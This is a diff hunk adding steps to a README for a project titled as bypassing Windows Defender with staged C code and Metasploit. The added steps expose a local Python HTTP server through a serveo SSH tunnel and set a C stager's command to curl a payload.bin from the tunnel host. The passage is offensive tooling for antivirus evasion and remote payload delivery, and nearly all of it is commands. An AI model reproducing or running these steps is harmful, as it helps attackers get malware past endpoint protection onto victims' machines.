@@ -40,3 +40,17 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
    - python -m http.server 8090
   ```
 
+  - Create the serveo key and expose python server using a serveo tunnel
+  ```
+   - ssh-keygen -t rsa -b 4096 -f ~/.ssh/serveo_key
+   - ssh -i ~/.ssh/serveo_key -R yourServer:80:localhost:8090 serveo.net
+  ```
+
+  - Create the main.c file and modify the "command" variable with your server
+  ```
+   - char *command = "curl https://yourServer.serveo.net/payload.bin";
+  ```
+
+  <p align="center">
+    <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/ngrok-tcp.jpg">
+   </p>
